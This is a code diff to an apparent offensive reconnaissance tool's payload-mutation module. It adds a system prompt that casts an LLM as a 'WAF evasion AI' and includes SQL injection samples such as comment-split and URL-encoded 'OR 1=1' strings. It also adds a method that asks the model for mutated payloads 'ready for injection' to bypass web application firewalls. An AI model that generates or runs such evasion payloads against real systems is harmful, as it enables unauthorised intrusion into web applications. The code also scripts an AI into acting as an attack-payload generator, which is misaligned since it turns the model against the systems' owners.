@@ -11,6 +11,33 @@ from typing import List
 
 logger = logging.getLogger("recon.payload_mutation")
 
+# ─── SYSTEM PROMPT FOR WAF EVASION ──────────────────────────────────────────
+_WAF_EVASION_SYSTEM = """You are a WAF evasion AI.
+
+Mutate the payload to bypass filters.
+
+Use techniques:
+
+- case variation
+- encoding
+- comment insertion
+- keyword splitting
+- URL encoding
+
+Return mutated payloads in JSON format.
+
+Example:
+
+{
+ "mutations": [
+   "'/**/OR/**/1=1--",
+   "%27%20OR%201%3D1--",
+   "' OR 1=1#"
+ ]
+}
+
+FOCUS on realistic bypass techniques that would evade common WAF rules."""
+
 
 class PayloadMutator:
     """
@@ -21,7 +48,8 @@ class PayloadMutator:
     - Obfuscation techniques
     """
 
-    def __init__(self):
+    def __init__(self, groq_client=None):
+        self.groq = groq_client
         self.encodings = [
             self._base64_encode,
             self._url_encode,
@@ -70,6 +98,54 @@ class PayloadMutator:
 
         logger.info(f"[MUTATION] Generated {len(mutated)} mutated payloads from {len(payloads)} originals")
         return mutated
+
+    def mutate_payloads_with_ai(self, payloads: List[str]) -> List[str]:
+        """
+        Mutate payloads using AI/Groq for advanced WAF evasion techniques.
+        Falls back to standard mutation if AI not available.
+        """
+        if not self.groq:
+            return self.mutate_payloads(payloads)
+
+        try:
+            import json
+            payload_list_str = json.dumps(payloads[:5], indent=2)  # Top 5 payloads
+            
+            prompt = f"""Generate 10 advanced WAF evasion mutations for these payloads:
+
+{payload_list_str}
+
+Focus on:
+- Case variations (case_mix, case_invert)
+- Encoding bypass (double URL, HTML entities)
+- Comment injection (/**/ style comments, SQL comments)
+- Keyword splitting and obfuscation
+- Unicode and hex encoding
+
+Return JSON with list of mutated payloads ready for injection."""
+
+            response = self.groq.generate(
+                prompt=prompt,
+                system=_WAF_EVASION_SYSTEM,
+                temperature=0.3
+            )
+
+            try:
+                result = json.loads(response)
+                mutations = result.get('mutations', []) if isinstance(result, dict) else result
+                
+                if isinstance(mutations, list):
+                    # Deduplicate with original payloads
+                    unique_mutations = [m for m in mutations if m not in payloads]
+                    logger.info(f"[MUTATION] AI generated {len(unique_mutations)} WAF evasion payloads")
+                    return unique_mutations[:15]  # Limit to 15
+            except (json.JSONDecodeError, ValueError):
+                logger.debug(f"[MUTATION] Failed to parse AI mutations, falling back")
+        except Exception as e:
+            logger.debug(f"[MUTATION] AI mutation failed: {e}, using standard mutation")
+
+        # Fallback to standard mutation
+        return self.mutate_payloads(payloads)
 
     def _apply_encodings(self, payload: str) -> List[str]:
         """Apply various encoding transformations"""
